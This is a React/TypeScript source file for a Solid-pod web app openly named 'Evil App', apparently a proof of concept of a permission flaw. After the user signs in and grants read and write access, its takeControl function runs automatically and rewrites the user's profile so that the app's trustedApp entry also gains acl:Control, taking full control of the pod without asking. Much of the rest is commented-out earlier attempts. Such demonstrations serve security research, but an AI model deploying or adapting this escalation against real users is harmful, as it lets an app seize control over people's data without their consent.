import { fetch, handleIncomingRedirect, login } from '@inrupt/solid-client-authn-browser';
import { acl } from 'rdf-namespaces';
import * as rdf from 'rdflib';
import React, { useEffect, useState } from 'react';
import './App.css';

function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isLoading, setIsLoading] = useState(true)
  const [user, setUser] = useState('')

  useEffect(() => {
    (async () => {
      const session = await handleIncomingRedirect()
      setIsLoading(false)
      if (!session) {
        setUser('')
        setIsLoggedIn(false)
        return
      }
      setIsLoggedIn(session.isLoggedIn)
      setUser(session?.webId ?? '')
    })()
  }, [])

  if (isLoading) return <>Initializing...</>
  return (
    <>
    <h1>Welcome to Evil App. It will get Control access of your pod when you first sign in. Just make sure you give it read and write access.</h1>
    {!isLoggedIn ? <Login /> : <Evil user={user} />}
    </>
  );
}

export default App;

const Login = () => {
  const [provider, setProvider] = useState('https://solidcommunity.net')
  const handleSubmit: React.FormEventHandler<HTMLFormElement> = async (e) => {
    e.preventDefault()
    await login({ oidcIssuer: provider })
  }
  return <>
  <form onSubmit={handleSubmit}>
    <input placeholder="solid identity provider" value={provider} onChange={e => setProvider(e.target.value)} />
    <input type="submit" value="sign in"/>
  </form>
  </>
}

const Evil = ({user}: { user: string}) => {
  useEffect(() => {
    takeControl(user).then(() => console.log('took over'))
  }, [user])
  return <><a href={user}>your profile</a></>
}

const createRandomPublicDocument = async (person: string) => {

}

const takeControl = async (user: string) => {
  const store = rdf.graph()
  const me = store.sym(user)
  const profile = me.doc()

  const fetcher = new rdf.Fetcher(store, { fetch })

  await fetcher.load(profile)
  /*const ourPermissions = store.each(me, rdf.sym('http://www.w3.org/ns/auth/acl#trustedApp')).filter(blank => store.any(blank as rdf.BlankNode, rdf.sym(acl.origin))?.value === globalThis.location.origin)

  const allTriples: rdf.Statement[] = []

  ourPermissions.forEach(node => allTriples.push(new rdf.Statement(me, rdf.sym('http://www.w3.org/ns/auth/acl#trustedApp'), node as rdf.BlankNode, profile)))
  ourPermissions.forEach(node => store.match(node as rdf.BlankNode).forEach(statement => allTriples.push(statement as rdf.Statement)))
 /*
  store.add(me, rdf.sym('http://example.com#predicate'), rdf.sym('http://example.com#object'))
  store.add(me, rdf.sym('http://www.w3.org/ns/auth/acl#trustedApp'), newBlankNode)
  store.add(newBlankNode, rdf.sym(acl.origin), rdf.sym('https://example.example'))

  console.log(await fetcher.putBack(user, {fetch}))
  console.log(store.fetcher)

  console.log(store.toNT())

  const 
*/

  // const newFetcher = new rdf.Fetcher(newStore as rdf.Store, {fetch})
  //await newFetcher.putBack(me, {fetch})

  // await fetcher.putBack(me, {fetch})
  const blank = store.each(me, rdf.sym('http://www.w3.org/ns/auth/acl#trustedApp')).find(blank => store.any(blank as rdf.BlankNode, rdf.sym(acl.origin))?.value === globalThis.location.origin)
  
  const updater = new rdf.UpdateManager(store)

  if (!blank) throw new Error('blank not found')

  const del = [] as const
  const ins = [new rdf.Statement(blank as rdf.BlankNode, rdf.sym(acl.mode), rdf.sym(acl.Control), profile)]
  await updater.update(del, ins)
  
/*
  const del = allTriples
  const ins = [
    new rdf.Statement(me, rdf.sym('http://www.w3.org/ns/auth/acl#trustedApp'), blankNode, profile),
    new rdf.Statement(blankNode, rdf.sym(acl.origin), rdf.sym(globalThis.location.origin), profile),
    new rdf.Statement(blankNode, rdf.sym(acl.mode), rdf.sym(acl.Append), profile),
    new rdf.Statement(blankNode, rdf.sym(acl.mode), rdf.sym(acl.Read), profile),
    new rdf.Statement(blankNode, rdf.sym(acl.mode), rdf.sym(acl.Write), profile),
    new rdf.Statement(blankNode, rdf.sym(acl.mode), rdf.sym(acl.Control), profile),
  ]
  // const ins = [new rdf.Statement(me, rdf.sym('http://example.com#predicate'), rdf.sym('http://example.com#object'), me)] as const
  console.log(await updater.update(del, ins))
  console.log(store.toNT())

//  const origin = store.match(permission, rdf.sym(acl.origin))
  /*
  console.log(permissions.map(permission => permission.value))
  const pnodes = permissions.map(id => store.each(rdf.sym(id), rdf.sym(acl.origin)))
  console.log(pnodes)
  */


}
